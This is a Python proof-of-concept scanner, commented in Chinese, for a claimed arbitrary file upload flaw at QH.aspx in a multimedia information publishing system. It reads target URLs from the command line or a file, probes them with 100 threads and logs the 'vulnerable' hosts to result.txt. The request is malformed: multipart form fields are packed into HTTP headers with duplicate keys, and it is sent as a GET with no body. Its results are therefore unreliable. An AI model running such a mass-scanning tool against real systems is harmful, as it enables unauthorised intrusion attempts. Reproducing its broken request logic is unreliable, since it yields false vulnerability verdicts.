# 某丰多媒体信息发布系统 QH.aspx 任意文件上传漏洞

import requests,argparse,sys
from multiprocessing.dummy import Pool
#忽略警告
requests.packages.urllib3.disable_warnings()
RED = '\033[91m' #输出颜色
RESET = '\033[0m'


def banner():
    banner = """
 ██▓    ▄▄▄       ███▄ ▄███▓    ██ ▄█▀ ██▓ ███▄    █   ▄████ 
▓██▒   ▒████▄    ▓██▒▀█▀ ██▒    ██▄█▒ ▓██▒ ██ ▀█   █  ██▒ ▀█▒
▒██▒   ▒██  ▀█▄  ▓██    ▓██░   ▓███▄░ ▒██▒▓██  ▀█ ██▒▒██░▄▄▄░
░██░   ░██▄▄▄▄██ ▒██    ▒██    ▓██ █▄ ░██░▓██▒  ▐▌██▒░▓█  ██▓
░██░    ▓█   ▓██▒▒██▒   ░██▒   ▒██▒ █▄░██░▒██░   ▓██░░▒▓███▀▒
░▓      ▒▒   ▓▒█░░ ▒░   ░  ░   ▒ ▒▒ ▓▒░▓  ░ ▒░   ▒ ▒  ░▒   ▒ 
 ▒ ░     ▒   ▒▒ ░░  ░      ░   ░ ░▒ ▒░ ▒ ░░ ░░   ░ ▒░  ░   ░ 
 ▒ ░     ░   ▒   ░      ░      ░ ░░ ░  ▒ ░   ░   ░ ░ ░ ░   ░ 
 ░           ░  ░       ░      ░  ░    ░           ░       ░ 
                                        info:某丰多媒体信息发布系统 QH.aspx 任意文件上传漏洞
                                        version:1.0 author:YeahSir               
"""
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description='某丰多媒体信息发布系统 QH.aspx 任意文件上传漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='please input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='please input your file path')
    args = parser.parse_args()
    #判断输入的参数是单个还是文件
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        #多线程
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload = "/QH.aspx"
    url = target+payload
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0", 
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryhbcZX7o0Hw19h3kr", 
        "Content-Disposition": "form-data; name=\"fileToUpload\"; filename=\"qwe.aspx\"", 
        "Content-Type": "application/octet-stream", 
        "Content-Disposition": "form-data; name=\"action\"", 
        "Content-Disposition": "form-data; name=\"responderId\"", 
        "Content-Disposition": "form-data; name=\"remotePath\""
    }

    try:
        re = requests.get(url=url,headers=headers,verify=False,timeout=5)
        if re.status_code == 200 and 'false' in re.text:
            print( f"{RED}[+] {target} 存在任意文件上传漏洞！{RESET}")
            with open('result.txt',mode='a',encoding='utf-8')as ft:
                ft.write(target+'\n')
        else:
            print(f'该{target}不存在任意文件上传漏洞')
    except Exception as e:
        print(f"[*] 该url出现错误:{target}, 错误信息：{str(e)}")


if __name__ == '__main__':
    main()